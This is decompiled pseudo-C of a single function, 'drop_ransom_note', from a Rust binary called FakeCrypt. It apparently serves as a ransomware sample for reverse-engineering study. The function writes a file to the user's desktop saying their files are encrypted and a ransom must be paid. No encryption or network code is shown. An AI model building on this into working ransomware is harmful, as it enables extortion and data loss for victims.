void _ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE(void)

{
  undefined8 uVar1;
  int local_64;
  int local_60;
  int iStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined8 local_50;
  int local_48;
  int iStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  undefined local_28 [24];
  
  (*(code *)PTR__ZN4dirs11desktop_dir17h701c4228176dceafE_001dec08)(&local_60);
  local_38 = local_50;
  local_48 = local_60;
  iStack_44 = iStack_5c;
  uStack_40 = uStack_58;
  uStack_3c = uStack_54;
                    /* try { // try from 00155671 to 00155696 has its CatchHandler @ 0015571a */
  _ZN3std4path4Path4join17h92d580baf012382bE
            (local_28,CONCAT44(uStack_54,uStack_58),local_50,&DAT_0010b418,0x18);
  _ZN3std2fs4File6create17h34a10c1ae837220bE(&local_60,local_28);
  if (local_60 != 1) {
    local_64 = iStack_5c;
                    /* try { // try from 001556a8 to 001556c5 has its CatchHandler @ 001556f4 */
    uVar1 = _ZN3std2io5Write9write_all17h61cad997d75bad86E
                      (&local_64,
                       "\nYour files have been encrypted.\n\nTo recover them, you must pay the ransom.\n\nFailure to do so will result in permanent loss of your data.\n"
                       ,0x8a);
    _ZN4core3ptr81drop_in_place_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT_17h52eca53ec7fb34e8E
              (uVar1);
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E(local_64);
  }
                    /* try { // try from 001556cf to 001556d8 has its CatchHandler @ 001556ef */
  _ZN4core3ptr39drop_in_place_LT_std__path__PathBuf_GT_17hff597253ed3a0574E(&local_48);
  if ((char)local_60 != '\0') {
    _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E
              (&local_60);
  }
  return;
}